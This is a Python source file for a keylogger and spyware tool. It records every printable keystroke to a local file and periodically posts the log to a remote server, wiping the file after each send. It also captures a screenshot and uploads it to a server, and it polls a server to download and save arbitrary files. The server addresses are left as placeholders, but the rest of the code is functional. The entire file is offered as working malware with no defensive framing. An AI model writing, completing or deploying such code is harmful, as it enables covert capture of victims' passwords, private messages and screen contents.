from pynput import keyboard
import threading
import requests
import time
from PIL import ImageGrab
import io
#----------------------------------------------------------------------
#multithreading
#rdm_sec = [500,600,700,800,900]
# This function runs every time a key is pressed
def on_press(key):
    try:
        # Try to get the printable character
        log = key.char
#        hook.send(log) #slow
#error handler
    except AttributeError:
        return
    # Save to file
    with open("keylog.txt", "a") as file:
        file.write(log)
#----------------------------------------------------------------------
def event_listener():
    # Start the key listener
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
#----------------------------------------------------------------------
#send content of file function
url1 = "web server here"
def send():
    while True:
        with open("keylog.txt", "r") as file:
            content = file.read()
        if not content.strip():
            time.sleep(5)
            continue
        # data = "hello world test!"
        requests.post(url1, json={"log": content})
        with open("keylog.txt", "r+") as con:
            con.seek(0)
            con.truncate()
        time.sleep(100)
#comment
#    time.sleep(300)
url2= "web upload/ "
#----------------------------------------------------------------------
def receiver(): #short polling
    while True:
        try:
            r = requests.get(url2)
            if r.status_code == 200:
                # filename from server header or fallback
                filename = r.headers.get("Content-Disposition", "").split("filename=")[-1].strip('"') \
                    if "filename=" in r.headers.get("Content-Disposition", "") else "latest_file"
                with open(filename, 'wb') as f:
                    for chunk in r.iter_content(chunk_size=8192):
                        if chunk:
                            f.write(chunk)
                print(f"File received and saved as {filename}")
                time.sleep(100)
        except Exception as e:
            print(f"[Receiver] Error: {e}")
            time.sleep(100)
#________________________________________________________
url3 = "web server here"
def screenshot():
    # Capture screenshot
    ss = ImageGrab.grab()
    buffer = io.BytesIO()
    ss.save(buffer, format="PNG")
    buffer.seek(0)
    # send to your own webserver
    requests.post( url3, files={"file": ("screenshot.png", buffer)})
#________________________________________________________
thread1 = threading.Thread(target=event_listener, daemon=True)
thread2 = threading.Thread(target=send, daemon=True)
thread3 = threading.Thread(target=receiver, daemon=True)
thread4 = threading.Thread(target=screenshot, daemon=True)
    # Start the threads
thread1.start()
thread2.start()
thread3.start()
thread4.start()
while True:
     pass







